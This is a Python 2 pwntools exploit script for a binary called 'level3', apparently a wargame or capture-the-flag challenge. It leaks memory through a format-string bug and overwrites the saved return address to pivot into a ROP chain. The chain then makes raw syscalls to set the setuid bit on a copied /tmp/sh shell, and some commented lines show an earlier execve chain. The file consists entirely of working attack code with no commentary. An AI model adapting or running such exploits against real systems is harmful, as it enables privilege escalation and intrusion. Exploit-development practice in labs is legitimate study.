#!/usr/bin/env python2
# encoding: utf-8
from __future__ import print_function

from pwn import *

context.terminal = ['terminator', '-e']
context.log_level = 'warning'
#context.log_level = 'debug'
IP = '192.168.56.101'
PORT = 44101

#r = remote(IP, PORT)
r = gdb.debug('./level3')
r.recvuntil(': ')


def read_addr(addr, length=0):
    if length:
        data = execute_fmt('AA' + p32(addr) + '%11$.{}s'.format(length))
        data = re.search('45AA.{4}(.+) is to high', data).group(1)
    else:
        data = execute_fmt('AA' + p32(addr) + '%11$s')
        data = re.search('45AA.{4}(.+) is to high', data).group(1)
    return data


def read_buf_addr():
    data = execute_fmt('%1$p ')
    return int(re.search('450x(.+) is to high', data).group(1), 16)


def execute_fmt(payload):
    r.sendline('45' + payload)
    data = r.recvuntil(': ')
    return data

bufaddr = read_buf_addr()
print('Buffer addr:', hex(bufaddr))

offset = 11
fmt = FmtStr(execute_fmt, offset=offset, padlen=2, numbwritten=0xd)
ebp = fmt.leak_stack(0x20c/4 + 10)
print('EBP:', hex(ebp))
stored_eip = (ebp & 0xfffffff0)-0x34

elf = ELF('level3')
rop = ROP([elf])
rop.migrate(bufaddr)
fmt.write(stored_eip, str(rop))
fmt.execute_writes()

mov_edx_eax = long(0x80797d1)
jmp_eax = long(0x804a737)
jmp_eax_ptr = long(0x08059441)
int_80 = long(0x08048bdd)
rop = ROP([elf], base=bufaddr)
rop.gadgets[mov_edx_eax] = {
        'insns': ['mov dword ptr [edx], eax', 'ret'],
        'regs': [],
        'move': 0
        }
rop.gadgets[jmp_eax] = {
        'insns': ['jmp eax'],
        'regs': [],
        'move': 0
        }
rop.gadgets[jmp_eax_ptr] = {
        'insns': ['jmp dword ptr [eax]'],
        'regs': [],
        'move': 0
        }
rop.gadgets[int_80] = {
        'insns': ['int 80'],
        'regs': [],
        'move': 0
        }

#rop.raw(rop.ecx_ebx[0])
#rop.raw(bufaddr+14*4)
#rop.raw(bufaddr+8*4)
#rop.raw(rop.edx[0])
#rop.raw(0)
#rop.raw(rop.eax[0])
#rop.raw(0xb)
#rop.raw(int_80)
#rop.raw('/bin/cp\x00')
#rop.raw('/bin/sh\x00')
#rop.raw('/tmp/sh\x00')
#rop.raw(bufaddr+8*4)
#rop.raw(bufaddr+10*4)
#rop.raw(bufaddr+12*4)
#rop.raw(0)
rop.raw(rop.ecx_ebx[0])
rop.raw(0o4755)
rop.raw(bufaddr+6*4)
rop.raw(rop.eax[0])
rop.raw(0xf)
rop.raw(int_80)
rop.raw('/tmp/sh\x00')
print(rop.dump())
context.log_level = 'debug'
chain = str(rop)
for i in range(7):
    r.sendline(chain)
    data = r.recvuntil(': ')
    if 'lose' in data:
        print(data)
        break
r.interactive()
